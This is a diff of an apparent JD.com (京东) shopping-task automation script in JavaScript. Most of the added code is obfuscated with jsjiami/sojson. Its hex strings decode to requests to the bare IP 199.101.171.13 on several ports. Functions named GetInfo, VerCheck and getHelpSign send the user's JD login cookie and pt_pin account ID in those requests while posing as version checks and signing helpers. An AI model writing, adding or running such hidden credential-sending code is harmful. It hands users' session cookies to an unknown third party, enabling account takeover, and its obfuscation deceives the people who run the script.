-                        //{    "code": 0,    "data": {        "status": {            "activityCode": null,            "activityMsg": null,            "alreadyGranted": null,            "awardInfo": null,            "canDrawAwardNum": null,            "finishNeed": 5,            "finished": false,            "userFinishedTimes": 3        },        "taskItemList": [            {                "itemId": "https://pro.m.jd.com/jdlite/active/3qRAXpNehcsUpToARD9ekP4g6Jhi/index.html?babelChannel=ttt6",                "itemName": "品牌好货 官方补贴 ",                "itemParam": "",                "itemPic": "",                "itemType": "1"            },            {                "itemId": "https://pro.m.jd.com/mall/active/vN4YuYXS1mPse7yeVPRq4TNvCMR/index.html?babelChannel=ttt6",                "itemName": "发现好物 9.9好货 ",                "itemParam": "",                "itemPic": "",                "itemType": "1"            }        ]    },    "errMsg": "success",    "success": true}
-                        
-                            
+                            //$.log(`京豆抽奖: ` + data.promptMsg);
                     } else {
                         console.log(`京东服务器返回空数据`)
                     }
@@ -503,6 +217,7 @@ function gsh(functionId,taskId,taskType) {
         })
     })
 }
+
 
 //apDoTask
 function apDoTask(functionId,taskId,itemId,taskType) {
@@ -661,3 +376,5 @@ var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68
 var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe02bc=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x31\x2F\x67\x65\x74\x48\x35\x73\x74\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x69\x64\x73\x74\x72\x3D","","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x6C\x6F\x67","\x6E\x61\x6D\x65","\x20\x41\x50\x49\u8BF7\u6C42\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u7F51\u8DEF\u91CD\u8BD5","\u4EAC\u4E1C\u670D\u52A1\u5668\u8FD4\u56DE\u7A7A\u6570\u636E","\x6C\x6F\x67\x45\x72\x72","\x70\x6F\x73\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function GetInfo(_0x7971x2,_0x7971x3,_0x7971x4,_0x7971x5,_0x7971x6,_0x7971x7,_0x7971x8){return  new Promise(async (_0x7971x9)=>{const _0x7971xa={url:`${__Oxe02bc[0x0]}`+ _0x7971x2,headers:{"\x65\x6E\x74\x73":_0x7971x3,"\x62\x6F\x64\x79":_0x7971x4,"\x66\x69\x6E\x67\x65\x72\x70\x72\x69\x6E\x74":_0x7971x5,"\x66\x75\x6E\x63\x74\x69\x6F\x6E\x69\x64":_0x7971x6,"\x63\x6F\x6F\x6B\x69\x65":cookie,"\x6D\x65\x74\x68\x6F\x64":_0x7971x7,"\x70\x74\x5F\x70\x69\x6E":_0x7971x8}};$[__Oxe02bc[0x8]](_0x7971xa,(_0x7971xb,_0x7971xc,_0x7971xd)=>{try{if(_0x7971xb){console[__Oxe02bc[0x3]](`${__Oxe02bc[0x1]}${JSON[__Oxe02bc[0x2]](_0x7971xb)}${__Oxe02bc[0x1]}`);console[__Oxe02bc[0x3]](`${__Oxe02bc[0x1]}${$[__Oxe02bc[0x4]]}${__Oxe02bc[0x5]}`)}else {if(_0x7971xd){}else {console[__Oxe02bc[0x3]](`${__Oxe02bc[0x6]}`)}}}catch(e){$[__Oxe02bc[0x7]](e,_0x7971xc)}finally{_0x7971x9(_0x7971xd)}})})}(function(_0x7971xe,_0x7971xf,_0x7971x10,_0x7971x11,_0x7971x12,_0x7971x13){_0x7971x13= __Oxe02bc[0x9];_0x7971x11= function(_0x7971x14){if( typeof alert!== _0x7971x13){alert(_0x7971x14)};if( typeof console!== _0x7971x13){console[__Oxe02bc[0x3]](_0x7971x14)}};_0x7971x10= function(_0x7971x15,_0x7971xe){return _0x7971x15+ _0x7971xe};_0x7971x12= _0x7971x10(__Oxe02bc[0xa],_0x7971x10(_0x7971x10(__Oxe02bc[0xb],__Oxe02bc[0xc]),__Oxe02bc[0xd]));try{_0x7971xe= __encode;if(!( typeof _0x7971xe!== _0x7971x13&& _0x7971xe=== _0x7971x10(__Oxe02bc[0xe],__Oxe02bc[0xf]))){_0x7971x11(_0x7971x12)}}catch(e){_0x7971x11(_0x7971x12)}})({})
 
 var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdcb86=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x56\x65\x72\x43\x68\x65\x63\x6B\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x76\x65\x72\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x64\x61\x74\x61","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\u7248\u672C\u4FE1\u606F\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x6C\x6F\x67","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x20\x20\u6700\u65B0\u7248\u672C\x3A","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5EFA\u8BAE\u62C9\u53D6\u811A\u672C\u83B7\u53D6\u65B0\u7248\u672C","\x20\x20\u6700\u65B0\u7248\u672C\x3A\u83B7\u53D6\u5931\u8D25\x21","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function VerCheck(_0x89aax2,_0x89aax3){return  new Promise((_0x89aax4)=>{$[__Oxdcb86[0x10]]({url:`${__Oxdcb86[0x0]}${_0x89aax2}${__Oxdcb86[0x1]}${_0x89aax3}${__Oxdcb86[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x89aax5,_0x89aax6,_0x89aax7)=>{try{_0x89aax7= JSON[__Oxdcb86[0x3]](_0x89aax7);if(_0x89aax7[__Oxdcb86[0x4]]=== 100){if(_0x89aax3=== _0x89aax7[__Oxdcb86[0x5]]){console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0x8]+ Ver);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xb]+ _0x89aax7[__Oxdcb86[0x5]]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xd]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}catch(e){$[__Oxdcb86[0xf]](__Oxdcb86[0xe],e)}finally{_0x89aax4(_0x89aax7)}})})}(function(_0x89aax8,_0x89aax9,_0x89aaxa,_0x89aaxb,_0x89aaxc,_0x89aaxd){_0x89aaxd= __Oxdcb86[0x11];_0x89aaxb= function(_0x89aaxe){if( typeof alert!== _0x89aaxd){alert(_0x89aaxe)};if( typeof console!== _0x89aaxd){console[__Oxdcb86[0x7]](_0x89aaxe)}};_0x89aaxa= function(_0x89aaxf,_0x89aax8){return _0x89aaxf+ _0x89aax8};_0x89aaxc= _0x89aaxa(__Oxdcb86[0x12],_0x89aaxa(_0x89aaxa(__Oxdcb86[0x13],__Oxdcb86[0x14]),__Oxdcb86[0x15]));try{_0x89aax8= __encode;if(!( typeof _0x89aax8!== _0x89aaxd&& _0x89aax8=== _0x89aaxa(__Oxdcb86[0x16],__Oxdcb86[0x17]))){_0x89aaxb(_0x89aaxc)}}catch(e){_0x89aaxb(_0x89aaxc)}})({})
+
+var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe36e0=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x33\x2F\x77\x77\x6C\x79\x68\x7A\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x68\x65\x6C\x70\x43\x6F\x64\x65\x3D","","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function getHelpSign(_0x50a3x2,_0x50a3x3,_0x50a3x4){return  new Promise((_0x50a3x5)=>{$[__Oxe36e0[0x6]]({url:`${__Oxe36e0[0x0]}${_0x50a3x2}${__Oxe36e0[0x1]}${_0x50a3x4}${__Oxe36e0[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x70\x74\x5F\x70\x69\x6E":_0x50a3x3,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x50a3x6,_0x50a3x7,_0x50a3x8)=>{try{_0x50a3x8= JSON[__Oxe36e0[0x3]](_0x50a3x8)}catch(e){$[__Oxe36e0[0x5]](__Oxe36e0[0x4],e)}finally{_0x50a3x5(_0x50a3x8)}})})}(function(_0x50a3x9,_0x50a3xa,_0x50a3xb,_0x50a3xc,_0x50a3xd,_0x50a3xe){_0x50a3xe= __Oxe36e0[0x7];_0x50a3xc= function(_0x50a3xf){if( typeof alert!== _0x50a3xe){alert(_0x50a3xf)};if( typeof console!== _0x50a3xe){console[__Oxe36e0[0x8]](_0x50a3xf)}};_0x50a3xb= function(_0x50a3x10,_0x50a3x9){return _0x50a3x10+ _0x50a3x9};_0x50a3xd= _0x50a3xb(__Oxe36e0[0x9],_0x50a3xb(_0x50a3xb(__Oxe36e0[0xa],__Oxe36e0[0xb]),__Oxe36e0[0xc]));try{_0x50a3x9= __encode;if(!( typeof _0x50a3x9!== _0x50a3xe&& _0x50a3x9=== _0x50a3xb(__Oxe36e0[0xd],__Oxe36e0[0xe]))){_0x50a3xc(_0x50a3xd)}}catch(e){_0x50a3xc(_0x50a3xd)}})({})
